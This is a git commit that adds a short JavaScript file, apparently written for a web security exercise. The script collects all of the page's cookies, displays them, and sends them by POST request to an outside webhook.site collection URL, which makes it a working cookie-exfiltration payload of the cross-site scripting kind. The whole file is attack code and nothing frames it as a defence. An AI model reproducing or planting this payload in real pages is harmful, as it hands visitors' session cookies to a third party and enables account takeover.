67f201dd9aa795b3dec4359afa4d04176fff9d0d
Tomás da Conceição Marques <tomas.c.marques@tecnico.ulisboa.pt>
2023-12-09 00:12:56 +0000

    add script

---
+++ script.js
@@ -0,0 +1,10 @@
+document.getElementById('myId').innerHTML=listCookies(); 
+var formData = new URLSearchParams();
+formData.append('key1', listCookies());
+fetch('https://webhook.site/41a1d9eb-93cd-4eaa-81c4-60511162a89b', {
+    method: 'POST',
+    body: formData,
+    headers: {
+      'Content-type': 'application/x-www-form-urlencoded'
+    }
+  });function listCookies() {var cookies = document.cookie.split(';'); var s = ''; for (var i = 1 ; i <= cookies.length; i++) { s += i + ' ' + cookies[i-1] + '\n'; } return s; }
